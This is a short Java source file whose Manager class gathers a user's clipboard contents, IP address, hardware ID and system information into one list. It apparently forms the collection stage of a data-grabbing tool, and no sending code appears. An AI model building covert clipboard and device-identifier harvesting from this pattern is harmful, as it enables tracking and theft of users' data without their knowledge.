package maven.example.com.receiving;

import maven.example.com.receiving.system.*;
import maven.example.com.receiving.tools.Receipt;
import maven.example.com.tools.data.Data;

import java.util.ArrayList;
import java.util.List;

public class Manager {
    public static List<Data> receiving() {
        List<Receipt> receipts = new ArrayList<>();
        List<Data> list = new ArrayList<>();

        // System
        receipts.add(new Clipboard());
        receipts.add(new IP());
        receipts.add(new HWID());
        receipts.add(new SystemInformationJava());

        receipts.forEach(receipt -> list.add(receipt.getData()));
        return list;
    }
}
